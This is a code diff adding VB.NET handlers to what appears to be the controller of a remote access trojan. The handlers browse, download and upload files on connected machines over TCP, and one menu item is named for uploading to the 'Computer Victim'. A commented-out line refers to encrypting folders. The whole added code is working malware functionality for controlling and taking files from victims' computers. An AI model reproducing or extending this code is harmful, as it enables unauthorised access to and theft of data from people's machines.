@@ -213,4 +213,101 @@ Public Class FMM
 
         Next
     End Sub
+
+    Private Sub ListView1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListView1.MouseDoubleClick
+
+        Dim theendpoint As String = Me.Text
+
+        Dim Folder As String = Label3.Text & "\"
+
+        '      Dim wheretogo As String = ListView1.SelectedItems(0).Text + "\" + "@wheretogo"
+        Dim wheretogo As String = ListView1.SelectedItems(0).Text + "@wheretogo"
+
+        Dim AllToSend As String = Folder + wheretogo
+
+        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
+        For Each client As TcpClient In Heathen.LesClients
+
+            If theendpoint = client.Client.RemoteEndPoint.ToString Then
+
+                Try
+                    client.GetStream().Write(buffer, 0, buffer.Length)
+                Catch ex As Exception
+
+                    MessageBox.Show("The client seems to be offline")
+                End Try
+            End If
+
+        Next
+    End Sub
+
+    Private Sub DownloadThisFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadThisFileToolStripMenuItem.Click
+        Dim ThefileOrFolrderToDelete As String = Label3.Text + "\" + ListView1.SelectedItems(0).Text
+        Dim theendpoint As String = Me.Text
+        Dim Itstimetodeleteselectedfile As String
+
+        If ListView1.SelectedItems(0).ImageKey = "files" Then
+
+
+            Itstimetodeleteselectedfile = "\DownloadThisFilePlease/"
+
+            '       ElseIf ListView1.SelectedItems(0).ImageKey = "folders" Then
+        Else
+            MessageBox.Show("You've selected a folder !")
+            '   Itstimetodeleteselectedfile = "CryptThatShitPlease" + "FOLDERS" + o
+        End If
+
+        Dim AllToSend As String = ThefileOrFolrderToDelete + Itstimetodeleteselectedfile
+
+
+        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
+        For Each client As TcpClient In Heathen.LesClients
+
+            If theendpoint = client.Client.RemoteEndPoint.ToString Then
+
+                Try
+                    client.GetStream().Write(buffer, 0, buffer.Length) '''
+                Catch ex As Exception
+
+                    MessageBox.Show("The client seems to be offline")
+                End Try
+            End If
+
+        Next
+    End Sub
+
+    Private Sub UploadAFileOnComputerVictimToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadAFileOnComputerVictimToolStripMenuItem.Click
+        If ListView1.SelectedItems(0).ImageKey = "folders" Then
+
+            If OpenFileDial1.ShowDialog = DialogResult.OK Then
+                Dim SFile As String = Convert.ToBase64String(IO.File.ReadAllBytes(OpenFileDial1.FileName))
+                Dim theendpoint As String = Me.Text
+                Dim EndName As String() = Split(OpenFileDial1.FileName, "\")
+
+                MessageBox.Show(EndName(EndName.Length - 1))
+                '      Dim wheretogo As String = ListView1.SelectedItems(0).Text + "\" + "@wheretogo"
+                Dim wheretowriteIT As String = "\\\UploadThereSir///" + ListView1.SelectedItems(0).Text + "\" + EndName(EndName.Length - 1)
+
+                Dim AllToSend As String = SFile + wheretowriteIT
+
+                Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
+                For Each client As TcpClient In Heathen.LesClients
+
+                    If theendpoint = client.Client.RemoteEndPoint.ToString Then
+
+                        Try
+                            client.GetStream().Write(buffer, 0, buffer.Length)
+                        Catch ex As Exception
+
+                            MessageBox.Show("The client seems to be offline")
+                        End Try
+                    End If
+
+                Next
+            End If
+        Else
+            MessageBox.Show("You've selected a file as destination of uploading !")
+        End If
+
+    End Sub
 End Class
